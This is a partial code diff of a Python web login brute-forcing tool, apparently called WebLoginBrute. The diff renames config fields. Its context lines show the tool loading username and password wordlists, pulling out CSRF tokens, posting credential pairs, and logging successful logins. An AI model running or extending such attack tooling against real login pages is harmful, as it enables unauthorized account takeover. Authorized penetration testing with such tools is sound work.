@@ -36,10 +36,10 @@ class WebLoginBrute:
     def run(self):
         logging.info("开始WebLoginBrute主流程...")
         # 1. 预解析目标域名
-        self.http.pre_resolve_targets([self.config.form_url, self.config.submit_url])
+        self.http.pre_resolve_targets([self.config.form, self.config.submit])
         # 2. 加载字典
-        usernames = list(load_wordlist(self.config.username_file, self.config))
-        passwords = list(load_wordlist(self.config.password_file, self.config))
+        usernames = list(load_wordlist(self.config.users, self.config))
+        passwords = list(load_wordlist(self.config.passwords, self.config))
         logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
         # 3. 恢复进度
         loaded_attempts, stats_from_file = self.state.load_progress()
@@ -109,7 +109,7 @@ class WebLoginBrute:
         # 检查频率限制、对抗级别等可在此扩展
         try:
             # 1. 获取登录页面，提取token
-            resp = self.http.get(self.config.form_url)
+            resp = self.http.get(self.config.form)
             if not resp or not resp.text:
                 self.stats.update("other_errors")
                 return False
@@ -125,10 +125,10 @@ class WebLoginBrute:
             data = {"username": username, "password": password}
             if self.config.csrf and token:
                 data[self.config.csrf] = token
-            if self.config.login_field and self.config.login_value:
-                data[self.config.login_field] = self.config.login_value
+            if self.config.field and self.config.value:
+                data[self.config.field] = self.config.value
             # 3. 发送登录请求
-            resp2 = self.http.post(self.config.submit_url, data=data)
+            resp2 = self.http.post(self.config.submit, data=data)
             # 4. 检查登录结果
             if self._check_login_success(resp2):
                 logging.info(f"登录成功: {username}:{password}")
